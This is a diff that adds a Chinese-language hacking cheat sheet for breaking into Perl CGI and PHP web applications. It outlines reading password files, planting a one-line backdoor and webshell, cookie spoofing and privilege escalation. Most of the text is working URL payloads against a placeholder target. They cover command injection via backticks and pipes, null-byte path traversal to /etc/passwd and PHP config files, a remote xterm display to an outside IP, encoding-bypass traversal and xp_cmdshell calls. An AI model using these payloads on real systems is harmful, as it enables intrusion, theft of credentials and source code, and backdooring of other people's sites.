@@ -1,0 +1,45 @@
+总体思路，跳过限制，查看敏感文件和密码相关文件。写入一句话cgi，进后台试传webshell（后台如果加验证或者MD5过的时候，可以试着  
+cookies欺骗，本地提交），寻找可执行的目录和相关函数，拿shell…………》提权  
+感谢EMM和ps的睿智和他们高超的脚本技术，还有以前老红4的脚本群英和国外的那些牛淫们  
+注“  
+perl脚本的漏洞大多出在open()、system()或者 ’’调用中。前者允许读写和执行，而后两个允许执行。  
+以POST的方法发送表格的话，就不能蒙混过关（%00将不会被解析），所以我们大部分用GET  
+
+http://target.com/cgi-bin/home/news/sub.pl?12 随意构造  
+http://target.com/cgi-bin/home/news/sub.pl?& 换个字符，也许可以执行呢  
+http://target.com/cgi-bin/home/news/sub.pl?`ls` 单引号  
+http://target.com/cgi-bin/home/news/sub.pl?`id`  
+http://target.com/cgi-bin/home/news/sub.pl?`IFS=!;uname!-a`  
+http://target.com/cgi-bin/home/news/sub.pl?`cat<’/home1/siteadm/cgi-bin/home/news/sub.pl’` 非常好的思路，把代码cat回来显示  
+
+http://target.com/test.pl;ls|  
+http://target.com/index.cgi?page=|ls+-la+/%0aid%0awhich+xterm|  
+http://target.com/index.cgi?page=|xterm+-isplay+10.0.1.21:0.0+%26|  
+http://target.com/test.pl?’id’ 类似’’内的操作和命令执行自己构造  
+比如：cat<’/home1/siteadm/cgi-bin/home/news/test.pl’` 把pl代码显示出来。  
+http://target.com/index.cgi?page=;dir+c:\|&cid=03417 类似asp的Sql injection  
+
+http://target.com/test.pl?&........ /../../etc/passwd  
+
+http://www.target.org/cgi-bin/cl ... info.pl?user=./test 前面加./  
+http://www.target.org/cgi-bin/cl ... nfo.pl?user=test%00 注意后面的 %00 别弄丢了  
+http://www.target.org/cgi-bin/cl ... ../../etc/passwd%00  
+
+http://www.target.org/show.php?f ... /include/config.php 查看php代码  
+http://www.target.org/show.php?f ... ng/admin/global.php  
+
+emm和ps的一句话
+
+http://www.target.org/cgi-bin/cl ... /../../../bin/ls%20  
+
+>bbb%20|  
+
+http://www.target.org/cgi-bin/club/scripts\’less showpost.pl\’ 并且寻找（用\’/\’）\’Select\’ 字符串  
+
+http://www.target.org/cgi-bin/cl ... bin/sh.elf?ls+/http 这里的是elf是CCS中文linux操作系统特征  
+http://www.target.org/csapi/..%c0%afhttp/china.sh”+.elf?”+&+ls+/bin  
+
+相关html为后缀的脚本技术，继续深挖中，但是不可质疑的是提交数据查询语句也是一种完美的方法  
+http://target.com/index.html#cmd.exe  
+http://target.com/index.html?dummyparam=xp_cmdshell  
+lynx http://target.com/cgi-bin/htmlscript?../../../../etc/passwd  
